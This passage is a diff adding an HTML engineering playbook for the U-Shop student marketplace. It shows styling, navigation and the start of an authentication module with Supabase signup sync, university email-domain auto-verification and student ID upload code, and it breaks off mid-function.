@@ -1,0 +1,1444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>U-Shop · Feature Implementation Playbook</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,500;1,9..144,300&display=swap" rel="stylesheet">
+<style>
+:root {
+  --red:#E8000B; --black:#0A0A0A; --purple:#6B1FA8; --magenta:#D4009B;
+  --grad:linear-gradient(90deg,#6B1FA8,#D4009B);
+  --express:#68a063; --supa:#3ecf8e; --paystack:#00c3f7; --next:#0070f3;
+  --bg:#0d0e11; --bg2:#13151a; --bg3:#1a1d25; --surface:#1e2130;
+  --line:rgba(255,255,255,0.07); --line2:rgba(255,255,255,0.12);
+  --text:#e8e8f0; --muted:#7a7d8e; --soft:#b0b3c4;
+  --green:#22c55e; --amber:#f59e0b; --blue:#3b82f6; --rose:#f43f5e; --cyan:#06b6d4;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{font-family:'Fraunces',Georgia,serif;background:var(--bg);color:var(--text);font-size:15px;line-height:1.75;}
+
+/* ── NAV ── */
+.nav{position:fixed;top:0;left:0;bottom:0;width:240px;background:var(--bg2);border-right:1px solid var(--line);display:flex;flex-direction:column;z-index:200;overflow-y:auto;}
+.nav-logo{padding:20px 18px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;flex-shrink:0;}
+.nl-u{background:var(--red);width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-size:15px;font-weight:800;color:#fff;}
+.nl-sh{font-family:'Syne',sans-serif;font-size:15px;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;padding:0 7px;line-height:26px;}
+.nl-badge{margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:8px;background:rgba(232,0,11,0.15);color:var(--red);border:1px solid rgba(232,0,11,0.3);padding:2px 6px;border-radius:3px;letter-spacing:0.08em;}
+.nav-mod{padding:12px 18px 4px;font-family:'IBM Plex Mono',monospace;font-size:8px;letter-spacing:0.2em;text-transform:uppercase;color:rgba(255,255,255,0.18);}
+.nav-mod-title{padding:6px 18px;font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:600;color:rgba(255,255,255,0.5);border-left:2px solid var(--red);margin:2px 0;}
+.nav a{display:flex;align-items:flex-start;gap:8px;padding:5px 18px 5px 24px;color:var(--muted);text-decoration:none;font-family:'IBM Plex Mono',monospace;font-size:10px;line-height:1.4;transition:all 0.12s;}
+.nav a:hover{color:var(--text);background:rgba(255,255,255,0.03);}
+.nav a .n{color:var(--red);font-size:8px;padding-top:2px;flex-shrink:0;min-width:14px;}
+.nav-footer{padding:14px 18px;margin-top:auto;border-top:1px solid var(--line);font-family:'IBM Plex Mono',monospace;font-size:8px;color:rgba(255,255,255,0.15);flex-shrink:0;}
+
+/* ── MAIN ── */
+.main{margin-left:240px;}
+
+/* ── COVER ── */
+.cover{background:var(--black);min-height:100vh;padding:64px 68px;display:grid;grid-template-rows:1fr auto;position:relative;overflow:hidden;}
+.cover::before{content:'';position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--red);}
+.cover-mesh{position:absolute;inset:0;background:radial-gradient(ellipse 60% 50% at 80% 35%,rgba(232,0,11,0.08) 0%,transparent 65%),radial-gradient(ellipse 40% 40% at 15% 75%,rgba(107,31,168,0.08) 0%,transparent 55%),radial-gradient(ellipse 30% 30% at 55% 90%,rgba(0,195,247,0.06) 0%,transparent 50%);pointer-events:none;}
+.cover-grid{position:absolute;inset:0;opacity:0.025;background-image:linear-gradient(rgba(255,255,255,0.5) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.5) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;}
+.cover-content{position:relative;z-index:2;}
+.cover-eyebrow{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:0.22em;text-transform:uppercase;color:rgba(255,255,255,0.28);margin-bottom:48px;display:flex;align-items:center;gap:12px;}
+.cover-eyebrow .dot{width:5px;height:5px;border-radius:50%;background:var(--red);}
+.cover-logo{display:flex;align-items:center;margin-bottom:32px;}
+.cl-u{background:var(--red);width:68px;height:68px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-size:44px;font-weight:800;color:#fff;line-height:1;flex-shrink:0;}
+.cl-sh{font-family:'Syne',sans-serif;font-size:44px;font-weight:800;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;padding:0 12px;line-height:68px;}
+.cover-h1{font-family:'Syne',sans-serif;font-size:24px;font-weight:700;color:rgba(255,255,255,0.8);margin-bottom:12px;}
+.cover-sub{font-size:14px;color:rgba(255,255,255,0.36);max-width:580px;font-weight:300;line-height:1.75;margin-bottom:28px;font-style:italic;}
+.cover-modules{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;max-width:600px;}
+.cm-chip{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:10px 14px;}
+.cm-chip .cm-num{font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--red);margin-bottom:4px;}
+.cm-chip .cm-name{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;color:rgba(255,255,255,0.7);}
+.cm-chip .cm-sub{font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--muted);margin-top:2px;}
+.cover-meta{position:relative;z-index:2;display:grid;grid-template-columns:repeat(5,1fr);gap:14px;border-top:1px solid rgba(255,255,255,0.07);padding-top:22px;}
+.cvm .cvm-l{font-family:'IBM Plex Mono',monospace;font-size:8px;letter-spacing:0.16em;text-transform:uppercase;color:rgba(255,255,255,0.2);display:block;margin-bottom:4px;}
+.cvm .cvm-v{font-size:12px;color:rgba(255,255,255,0.58);font-family:'IBM Plex Mono',monospace;}
+
+/* ── BODY ── */
+.body{padding:0 68px 120px;max-width:980px;}
+.section{padding-top:72px;}
+.sec-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:0.24em;text-transform:uppercase;color:var(--red);margin-bottom:12px;display:flex;align-items:center;gap:10px;}
+.sec-label::after{content:'';flex:1;height:1px;background:var(--red);opacity:0.14;}
+h1{font-family:'Syne',sans-serif;font-size:28px;font-weight:800;margin-bottom:14px;letter-spacing:-0.02em;line-height:1.15;}
+h2{font-family:'Syne',sans-serif;font-size:18px;font-weight:700;margin:36px 0 12px;letter-spacing:-0.01em;}
+h3{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;margin-bottom:8px;}
+p{color:var(--soft);margin-bottom:10px;line-height:1.75;}
+strong{color:var(--text);}
+code,.mono{font-family:'IBM Plex Mono',monospace;font-size:12px;background:var(--surface);padding:2px 7px;border-radius:3px;color:#a5d6ff;}
+pre{font-family:'IBM Plex Mono',monospace;font-size:12px;background:var(--bg3);border:1px solid var(--line2);border-radius:8px;padding:20px 22px;overflow-x:auto;line-height:1.7;color:#cdd6f4;margin:14px 0;tab-size:2;}
+pre .cm{color:#5c6370;font-style:italic;}
+pre .kw{color:#cba6f7;}
+pre .str{color:#a6e3a1;}
+pre .fn{color:#89dceb;}
+pre .num{color:#fab387;}
+pre .var{color:#cdd6f4;}
+pre .type{color:#f5c2e7;}
+pre .field{color:#89b4fa;}
+.divider{border:none;border-top:1px solid var(--line);margin:60px 0 0;}
+
+/* ── PILLAR HEADERS ── */
+.pillar{margin:28px 0 14px;display:flex;align-items:center;gap:10px;}
+.pillar-badge{font-family:'IBM Plex Mono',monospace;font-size:9px;padding:4px 10px;border-radius:3px;font-weight:600;white-space:nowrap;flex-shrink:0;}
+.pb-impl{background:rgba(59,130,246,0.15);color:var(--blue);border:1px solid rgba(59,130,246,0.25);}
+.pb-perf{background:rgba(34,197,94,0.12);color:var(--green);border:1px solid rgba(34,197,94,0.22);}
+.pb-sec{background:rgba(244,63,94,0.12);color:var(--rose);border:1px solid rgba(244,63,94,0.22);}
+.pb-log{background:rgba(6,182,212,0.12);color:var(--cyan);border:1px solid rgba(6,182,212,0.22);}
+.pb-edge{background:rgba(245,158,11,0.12);color:var(--amber);border:1px solid rgba(245,158,11,0.22);}
+.pb-test{background:rgba(139,92,246,0.12);color:#a78bfa;border:1px solid rgba(139,92,246,0.22);}
+.pillar h2{margin:0;font-size:17px;}
+
+/* ── CALLOUTS ── */
+.callout{border-left:3px solid;padding:14px 18px;border-radius:0 6px 6px 0;margin:16px 0;}
+.callout p{margin:0;}
+.callout-red{border-color:var(--rose);background:rgba(244,63,94,0.05);}
+.callout-green{border-color:var(--green);background:rgba(34,197,94,0.05);}
+.callout-blue{border-color:var(--blue);background:rgba(59,130,246,0.05);}
+.callout-amber{border-color:var(--amber);background:rgba(245,158,11,0.05);}
+.callout-cyan{border-color:var(--cyan);background:rgba(6,182,212,0.05);}
+.callout-purple{border-color:var(--purple);background:rgba(107,31,168,0.07);}
+.callout strong{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:0.06em;text-transform:uppercase;display:block;margin-bottom:5px;}
+.callout-red strong{color:var(--rose);}
+.callout-green strong{color:var(--green);}
+.callout-blue strong{color:var(--blue);}
+.callout-amber strong{color:var(--amber);}
+.callout-cyan strong{color:var(--cyan);}
+.callout-purple strong{color:#c084fc;}
+
+/* ── TABLES ── */
+.ctable{width:100%;border-collapse:collapse;margin:14px 0;font-size:13px;}
+.ctable th{text-align:left;font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);padding:9px 13px;border-bottom:2px solid var(--line2);background:var(--bg3);}
+.ctable td{padding:10px 13px;border-bottom:1px solid var(--line);vertical-align:top;color:var(--soft);}
+.ctable tr:last-child td{border-bottom:none;}
+.ctable tr:hover td{background:rgba(255,255,255,0.015);}
+.ctable td:first-child{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text);font-weight:500;}
+
+/* ── LOG LEVELS ── */
+.log-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:14px 0;}
+.log-card{border-radius:7px;padding:14px 16px;border:1px solid;}
+.log-info{background:rgba(59,130,246,0.06);border-color:rgba(59,130,246,0.2);}
+.log-warn{background:rgba(245,158,11,0.06);border-color:rgba(245,158,11,0.2);}
+.log-fatal{background:rgba(244,63,94,0.06);border-color:rgba(244,63,94,0.2);}
+.log-card h4{font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:600;margin-bottom:8px;letter-spacing:0.1em;}
+.log-info h4{color:var(--blue);}
+.log-warn h4{color:var(--amber);}
+.log-fatal h4{color:var(--rose);}
+.log-card ul{list-style:none;}
+.log-card ul li{font-size:11px;color:var(--muted);padding:3px 0;border-bottom:1px solid var(--line);display:flex;gap:6px;}
+.log-card ul li:last-child{border-bottom:none;}
+.log-card ul li::before{content:'·';color:rgba(255,255,255,0.2);flex-shrink:0;}
+
+/* ── FLOW STEPS ── */
+.flow{margin:16px 0;}
+.flow-step{display:flex;gap:14px;margin-bottom:2px;position:relative;}
+.flow-step:not(:last-child)::after{content:'';position:absolute;left:15px;top:32px;bottom:-2px;width:2px;background:var(--line);}
+.fn{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:600;color:#fff;flex-shrink:0;}
+.fn-r{background:var(--red);}
+.fn-b{background:var(--blue);}
+.fn-g{background:var(--green);}
+.fn-p{background:var(--paystack);color:var(--black) !important;}
+.fn-a{background:var(--amber);color:var(--black) !important;}
+.fn-e{background:var(--express);}
+.fn-s{background:var(--supa);color:var(--black) !important;}
+.flow-body{padding-top:5px;padding-bottom:16px;}
+.flow-body h4{font-size:13px;font-weight:600;color:var(--text);margin-bottom:3px;font-family:'Syne',sans-serif;}
+.flow-body p{font-size:12.5px;color:var(--muted);margin:0;}
+
+/* ── EDGE CASE CARDS ── */
+.edge-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0;}
+.edge-card{background:var(--bg3);border:1px solid var(--line2);border-radius:7px;padding:16px 18px;border-top:2px solid var(--amber);}
+.edge-card h4{font-size:13px;font-weight:700;color:var(--text);margin-bottom:6px;font-family:'Syne',sans-serif;}
+.edge-card .edge-problem{font-size:12px;color:var(--muted);margin-bottom:8px;}
+.edge-card .edge-fix{font-size:12px;color:rgba(34,197,94,0.8);padding:8px 10px;background:rgba(34,197,94,0.05);border-radius:4px;border-left:2px solid var(--green);}
+
+/* ── TEST CHECKLIST ── */
+.test-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0;}
+.test-card{background:var(--bg3);border:1px solid var(--line2);border-radius:7px;padding:16px 18px;}
+.test-card h4{font-family:'IBM Plex Mono',monospace;font-size:10px;color:#a78bfa;margin-bottom:8px;letter-spacing:0.08em;}
+.test-card ul{list-style:none;}
+.test-card ul li{font-size:12px;color:var(--muted);padding:4px 0;border-bottom:1px solid var(--line);display:flex;gap:8px;}
+.test-card ul li:last-child{border-bottom:none;}
+.test-card ul li::before{content:'□';font-family:'IBM Plex Mono',monospace;font-size:10px;color:rgba(167,139,250,0.4);flex-shrink:0;}
+
+/* ── INSIGHT BOX ── */
+.insight{background:var(--black);border:1px solid var(--line2);border-left:4px solid var(--red);border-radius:0 8px 8px 0;padding:16px 20px;margin:16px 0;}
+.insight .ins-l{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:0.16em;text-transform:uppercase;color:var(--red);margin-bottom:6px;}
+.insight p{color:rgba(255,255,255,0.48);margin:0;font-size:13px;line-height:1.7;}
+.insight strong{color:rgba(255,255,255,0.78);}
+
+/* ── MODULE HEADER ── */
+.module-header{background:var(--bg3);border:1px solid var(--line2);border-radius:10px;padding:22px 26px;margin-bottom:32px;display:flex;gap:20px;align-items:center;}
+.mh-num{font-family:'Syne',sans-serif;font-size:48px;font-weight:800;color:rgba(255,255,255,0.06);line-height:1;flex-shrink:0;width:60px;}
+.mh-content{}
+.mh-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:0.2em;text-transform:uppercase;color:var(--red);margin-bottom:6px;}
+.mh-title{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;letter-spacing:-0.01em;margin-bottom:6px;}
+.mh-sub{font-size:13px;color:var(--muted);}
+.mh-tags{display:flex;gap:7px;margin-top:10px;flex-wrap:wrap;}
+.mh-tag{font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 8px;border-radius:3px;border:1px solid;}
+
+/* ── FOOTER ── */
+.footer{background:var(--bg2);border-top:1px solid var(--line);padding:18px 68px;display:flex;align-items:center;justify-content:space-between;}
+.ft-logo{display:flex;align-items:center;}
+.ft-u{background:var(--red);width:19px;height:19px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-size:11px;font-weight:800;color:#fff;}
+.ft-sh{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;padding:0 6px;}
+.ft-r{font-family:'IBM Plex Mono',monospace;font-size:8px;color:rgba(255,255,255,0.18);letter-spacing:0.1em;}
+
+ul.ul{list-style:none;margin:10px 0;}
+ul.ul li{font-size:13.5px;color:var(--soft);padding:5px 0;border-bottom:1px solid var(--line);display:flex;gap:10px;}
+ul.ul li:last-child{border-bottom:none;}
+ul.ul li::before{content:'→';font-family:'IBM Plex Mono',monospace;color:var(--red);flex-shrink:0;font-size:11px;padding-top:2px;}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="nav">
+  <div class="nav-logo"><div class="nl-u">U</div><div class="nl-sh">shop</div><span class="nl-badge">Playbook</span></div>
+
+  <div class="nav-mod">Module 01</div>
+  <div class="nav-mod-title">Auth & Verification</div>
+  <a href="#m1-impl"><span class="n">›</span>Implementation Logic</a>
+  <a href="#m1-perf"><span class="n">›</span>Performance</a>
+  <a href="#m1-sec"><span class="n">›</span>Security</a>
+  <a href="#m1-log"><span class="n">›</span>Logging</a>
+  <a href="#m1-edge"><span class="n">›</span>Edge Cases</a>
+  <a href="#m1-test"><span class="n">›</span>Testing</a>
+
+  <div class="nav-mod">Module 02</div>
+  <div class="nav-mod-title">Store & Policy</div>
+  <a href="#m2-impl"><span class="n">›</span>Implementation Logic</a>
+  <a href="#m2-perf"><span class="n">›</span>Performance</a>
+  <a href="#m2-sec"><span class="n">›</span>Security</a>
+  <a href="#m2-log"><span class="n">›</span>Logging</a>
+  <a href="#m2-edge"><span class="n">›</span>Edge Cases</a>
+  <a href="#m2-test"><span class="n">›</span>Testing</a>
+
+  <div class="nav-mod">Module 03</div>
+  <div class="nav-mod-title">Product Catalog & Search</div>
+  <a href="#m3-impl"><span class="n">›</span>Implementation Logic</a>
+  <a href="#m3-perf"><span class="n">›</span>Performance</a>
+  <a href="#m3-sec"><span class="n">›</span>Security</a>
+  <a href="#m3-log"><span class="n">›</span>Logging</a>
+  <a href="#m3-edge"><span class="n">›</span>Edge Cases</a>
+  <a href="#m3-test"><span class="n">›</span>Testing</a>
+
+  <div class="nav-mod">Module 04</div>
+  <div class="nav-mod-title">Escrow Checkout & Payouts</div>
+  <a href="#m4-impl"><span class="n">›</span>Implementation Logic</a>
+  <a href="#m4-perf"><span class="n">›</span>Performance</a>
+  <a href="#m4-sec"><span class="n">›</span>Security</a>
+  <a href="#m4-log"><span class="n">›</span>Logging</a>
+  <a href="#m4-edge"><span class="n">›</span>Edge Cases</a>
+  <a href="#m4-test"><span class="n">›</span>Testing</a>
+
+  <div class="nav-footer">Playbook v1.0 · MVP Edition<br>Principal Engineer · Internal</div>
+</nav>
+
+<div class="main">
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-mesh"></div>
+  <div class="cover-grid"></div>
+  <div class="cover-content">
+    <div class="cover-eyebrow"><span class="dot"></span>Feature Implementation Playbook · Principal Engineer Edition</div>
+    <div class="cover-logo"><div class="cl-u">U</div><div class="cl-sh">shop</div></div>
+    <div class="cover-h1">MVP Feature Implementation Playbook</div>
+    <p class="cover-sub">A rigorous, step-by-step engineering guide to building the four core MVP modules to enterprise, production-ready standards. Covers implementation logic, performance, security, observability, edge cases, and deployment readiness for each module.</p>
+    <div class="cover-modules">
+      <div class="cm-chip"><div class="cm-num">MODULE 01</div><div class="cm-name">Auth & Verification</div><div class="cm-sub">JWT · Supabase · Student ID · Roles</div></div>
+      <div class="cm-chip"><div class="cm-num">MODULE 02</div><div class="cm-name">Store & Policy</div><div class="cm-sub">Custom URL · Policy Builder · OG Images</div></div>
+      <div class="cm-chip"><div class="cm-num">MODULE 03</div><div class="cm-name">Product Catalog & Search</div><div class="cm-sub">tsvector · Cursor pagination · Redis cache</div></div>
+      <div class="cm-chip"><div class="cm-num">MODULE 04</div><div class="cm-name">Escrow Checkout & Payouts</div><div class="cm-sub">Paystack · Escrow FSM · Wallet · Transfers</div></div>
+    </div>
+  </div>
+  <div class="cover-meta">
+    <div class="cvm"><span class="cvm-l">Document</span><span class="cvm-v">Playbook v1.0</span></div>
+    <div class="cvm"><span class="cvm-l">Stack</span><span class="cvm-v">Next.js 14 + Express</span></div>
+    <div class="cvm"><span class="cvm-l">DB</span><span class="cvm-v">Supabase + Prisma</span></div>
+    <div class="cvm"><span class="cvm-l">Payments</span><span class="cvm-v">Paystack</span></div>
+    <div class="cvm"><span class="cvm-l">Classification</span><span class="cvm-v">Internal</span></div>
+  </div>
+</div>
+
+<div class="body">
+
+<!-- ════════════════════════════════════════
+     MODULE 01 — AUTH & VERIFICATION
+════════════════════════════════════════ -->
+<div class="section" id="m1">
+  <div class="sec-label">Module 01</div>
+  <div class="module-header">
+    <div class="mh-num">01</div>
+    <div class="mh-content">
+      <div class="mh-label">Feature Module</div>
+      <div class="mh-title">Authentication & Student Verification</div>
+      <div class="mh-sub">Covers signup, login, JWT propagation, role assignment, email-domain verification, and the student ID upload review pipeline.</div>
+      <div class="mh-tags">
+        <span class="mh-tag" style="color:var(--supa);border-color:rgba(62,207,142,0.25)">Supabase Auth</span>
+        <span class="mh-tag" style="color:var(--blue);border-color:rgba(59,130,246,0.25)">JWT · httpOnly</span>
+        <span class="mh-tag" style="color:var(--amber);border-color:rgba(245,158,11,0.25)">Student Verification</span>
+        <span class="mh-tag" style="color:var(--rose);border-color:rgba(244,63,94,0.25)">Role-Based Auth</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- PILLAR 1 -->
+  <div class="pillar" id="m1-impl"><span class="pillar-badge pb-impl">Pillar 1</span><h2>Core Implementation Logic</h2></div>
+
+  <h3>Step 1 — Supabase Signup & User Record Sync</h3>
+  <p>Supabase manages identity (email/password, Google OAuth). Your Prisma <code>users</code> table manages application data (role, verification status, wallet). These two records must stay in sync. The sync happens via a server-side <code>POST /api/v1/auth/sync</code> call made immediately after the Supabase <code>SIGNED_IN</code> event for new users.</p>
+
+  <pre><code><span class="cm">// apps/web/app/(auth)/auth/callback/route.ts</span>
+<span class="cm">// This Next.js Route Handler fires after Supabase's OAuth or email confirmation redirect.</span>
+<span class="cm">// Its job: exchange the auth code for a session, then ensure a DB user record exists.</span>
+<span class="kw">import</span> { <span class="var">createClient</span> } <span class="kw">from</span> <span class="str">'@/lib/supabase/server'</span>
+<span class="kw">import</span> { <span class="var">NextResponse</span> } <span class="kw">from</span> <span class="str">'next/server'</span>
+<span class="kw">import</span> { <span class="var">apiFetch</span> } <span class="kw">from</span> <span class="str">'@/lib/api'</span>
+
+<span class="kw">export async function</span> <span class="fn">GET</span>(<span class="var">request: Request</span>) {
+  <span class="kw">const</span> { <span class="var">searchParams</span>, <span class="var">origin</span> } = <span class="kw">new</span> <span class="fn">URL</span>(<span class="var">request.url</span>)
+  <span class="kw">const</span> <span class="var">code</span> = <span class="var">searchParams.get</span>(<span class="str">'code'</span>)
+  <span class="kw">const</span> <span class="var">next</span> = <span class="var">searchParams.get</span>(<span class="str">'next'</span>) ?? <span class="str">'/'</span>
+
+  <span class="kw">if</span> (<span class="var">code</span>) {
+    <span class="kw">const</span> <span class="var">supabase</span> = <span class="fn">createClient</span>()
+    <span class="cm">// Exchange the one-time code for a persistent session cookie</span>
+    <span class="kw">const</span> { <span class="var">data</span>, <span class="var">error</span> } = <span class="kw">await</span> <span class="var">supabase.auth.exchangeCodeForSession</span>(<span class="var">code</span>)
+    <span class="kw">if</span> (!<span class="var">error</span> && <span class="var">data.session</span>) {
+      <span class="cm">// Upsert the user row in Postgres — idempotent, safe to call multiple times</span>
+      <span class="kw">await</span> <span class="fn">apiFetch</span>(<span class="str">'/auth/sync'</span>, {
+        <span class="var">method</span>: <span class="str">'POST'</span>,
+        <span class="cm">// apiFetch automatically attaches the Bearer token from the session</span>
+      }, <span class="var">data.session.access_token</span>)
+    }
+  }
+  <span class="kw">return</span> <span class="var">NextResponse.redirect</span>(`${<span class="var">origin</span>}${<span class="var">next</span>}`)
+}</code></pre>
+
+  <pre><code><span class="cm">// apps/api/src/services/auth.service.ts</span>
+<span class="cm">// syncUser() is idempotent. It creates the DB user if they don't exist,</span>
+<span class="cm">// or returns the existing record if they do. Safe to call on every login.</span>
+
+<span class="kw">export async function</span> <span class="fn">syncUser</span>(<span class="var">supabaseUser: SupabaseUser</span>) {
+  <span class="cm">// Extract role from metadata if user selected it during OAuth signup</span>
+  <span class="kw">const</span> <span class="var">requestedRole</span> = <span class="var">supabaseUser.user_metadata?.role</span> ?? <span class="str">'BUYER'</span>
+
+  <span class="kw">const</span> <span class="var">user</span> = <span class="kw">await</span> <span class="var">prisma.user.upsert</span>({
+    <span class="var">where</span>: { <span class="var">supabaseId</span>: <span class="var">supabaseUser.id</span> },
+    <span class="var">create</span>: {
+      <span class="var">supabaseId</span>: <span class="var">supabaseUser.id</span>,
+      <span class="var">email</span>:      <span class="var">supabaseUser.email!</span>,
+      <span class="var">name</span>:       <span class="var">supabaseUser.user_metadata?.full_name</span>,
+      <span class="var">role</span>:       <span class="fn">validateRole</span>(<span class="var">requestedRole</span>),
+      <span class="cm">// Create wallet at the same time — every user gets one from the start</span>
+      <span class="var">wallet</span>: { <span class="var">create</span>: { <span class="var">availableBalance</span>: <span class="num">0</span>, <span class="var">totalEarned</span>: <span class="num">0</span> } },
+    },
+    <span class="var">update</span>: { <span class="var">email</span>: <span class="var">supabaseUser.email!</span> }, <span class="cm">// Keep email in sync if user changes it in Supabase</span>
+    <span class="var">include</span>: { <span class="var">store</span>: <span class="kw">true</span>, <span class="var">wallet</span>: <span class="kw">true</span> }
+  })
+
+  <span class="cm">// Trigger student email auto-detection on every sync</span>
+  <span class="kw">if</span> (<span class="fn">isUniversityEmail</span>(<span class="var">supabaseUser.email!</span>) && <span class="var">user.verificationStatus</span> === <span class="str">'UNVERIFIED'</span>) {
+    <span class="kw">await</span> <span class="fn">autoVerifyStudentEmail</span>(<span class="var">user.id</span>, <span class="var">supabaseUser.email!</span>)
+  }
+  <span class="kw">return</span> <span class="var">user</span>
+}</code></pre>
+
+  <h3>Step 2 — Student Email Auto-Verification</h3>
+  <p>Maintain a curated allowlist of Ghanaian university email domains. Keep this in a config file versioned with the codebase, not in the database — it changes rarely and benefits from code review. Auto-verification happens synchronously during <code>syncUser</code>; it requires zero admin interaction.</p>
+
+  <pre><code><span class="cm">// apps/api/src/config/university-domains.ts</span>
+<span class="cm">// Add new universities here as a PR. Each entry is reviewed before merging.</span>
+<span class="kw">export const</span> <span class="var">UNIVERSITY_DOMAINS</span> = <span class="kw">new</span> <span class="fn">Set</span>([
+  <span class="str">'ug.edu.gh'</span>,       <span class="cm">// University of Ghana, Legon</span>
+  <span class="str">'st.ug.edu.gh'</span>,    <span class="cm">// UG student subdomain</span>
+  <span class="str">'knust.edu.gh'</span>,    <span class="cm">// Kwame Nkrumah University of Science & Technology</span>
+  <span class="str">'stu.knust.edu.gh'</span>,
+  <span class="str">'ucc.edu.gh'</span>,      <span class="cm">// University of Cape Coast</span>
+  <span class="str">'gimpa.edu.gh'</span>,    <span class="cm">// Ghana Institute of Management and Public Administration</span>
+  <span class="str">'uhas.edu.gh'</span>,     <span class="cm">// University of Health and Allied Sciences</span>
+  <span class="str">'uds.edu.gh'</span>,      <span class="cm">// University for Development Studies</span>
+  <span class="str">'ashesi.edu.gh'</span>,   <span class="cm">// Ashesi University</span>
+  <span class="str">'pentvars.edu.gh'</span>, <span class="cm">// Pentecost University</span>
+])
+
+<span class="kw">export function</span> <span class="fn">isUniversityEmail</span>(<span class="var">email: string</span>): <span class="type">boolean</span> {
+  <span class="kw">const</span> <span class="var">domain</span> = <span class="var">email.split</span>(<span class="str">'@'</span>)[<span class="num">1</span>]?.toLowerCase()
+  <span class="kw">return</span> <span class="var">domain</span> ? <span class="var">UNIVERSITY_DOMAINS.has</span>(<span class="var">domain</span>) : <span class="kw">false</span>
+}
+
+<span class="kw">async function</span> <span class="fn">autoVerifyStudentEmail</span>(<span class="var">userId: string</span>, <span class="var">email: string</span>) {
+  <span class="kw">await</span> <span class="var">prisma.user.update</span>({
+    <span class="var">where</span>: { <span class="var">id</span>: <span class="var">userId</span> },
+    <span class="var">data</span>: {
+      <span class="var">verificationStatus</span>: <span class="str">'VERIFIED'</span>,
+      <span class="var">studentEmail</span>:       <span class="var">email</span>,
+      <span class="var">verifiedAt</span>:         <span class="kw">new</span> <span class="fn">Date</span>(),
+      <span class="var">verifiedBy</span>:         <span class="str">'SYSTEM_EMAIL_DOMAIN'</span>,
+    }
+  })
+  <span class="var">logger.info</span>({ <span class="var">userId</span>, <span class="var">email</span>, <span class="var">method</span>: <span class="str">'email_domain'</span> }, <span class="str">'Student auto-verified via email domain'</span>)
+}</code></pre>
+
+  <h3>Step 3 — Student ID Upload (Fallback Verification)</h3>
+  <p>For students whose university isn't in the allowlist, or who use a personal email. The upload goes directly from the browser to Supabase Storage (bypassing Express for file transfer), then Express is notified with just the file path to update the user record and queue admin review.</p>
+
+  <pre><code><span class="cm">// Frontend — Client Component: apps/web/components/verification/IDUploadForm.tsx</span>
+<span class="cm">// Pattern: upload to Supabase Storage directly from browser,</span>
+<span class="cm">// then tell Express the path. Express NEVER handles the raw file bytes.</span>
+
+<span class="kw">async function</span> <span class="fn">handleUpload</span>(<span class="var">file: File</span>) {
+  <span class="kw">const</span> <span class="var">supabase</span> = <span class="fn">createBrowserClient</span>(...)
+
+  <span class="cm">// 1. Upload to private bucket — path is deterministic per user</span>
+  <span class="kw">const</span> <span class="var">filePath</span> = `student-ids/${<span class="var">userId</span>}/front-${<span class="fn">Date.now</span>()}.webp`
+  <span class="kw">const</span> { <span class="var">error</span> } = <span class="kw">await</span> <span class="var">supabase.storage</span>
+    .<span class="fn">from</span>(<span class="str">'verification-docs'</span>)    <span class="cm">// Private bucket — no public read</span>
+    .<span class="fn">upload</span>(<span class="var">filePath</span>, <span class="var">file</span>, { <span class="var">upsert</span>: <span class="kw">true</span> })
+  <span class="kw">if</span> (<span class="var">error</span>) <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'Upload failed'</span>)
+
+  <span class="cm">// 2. Notify Express — send only the path, not the file</span>
+  <span class="kw">await</span> <span class="fn">apiFetch</span>(<span class="str">'/users/verify-student'</span>, {
+    <span class="var">method</span>: <span class="str">'POST'</span>,
+    <span class="var">body</span>: <span class="var">JSON.stringify</span>({ <span class="var">idImagePath</span>: <span class="var">filePath</span> })
+  })
+}
+
+<span class="cm">// Backend — Express handler updates DB and queues admin notification</span>
+<span class="kw">async function</span> <span class="fn">submitStudentId</span>(<span class="var">userId: string</span>, <span class="var">idImagePath: string</span>) {
+  <span class="cm">// Validate the path belongs to this user — prevents path injection</span>
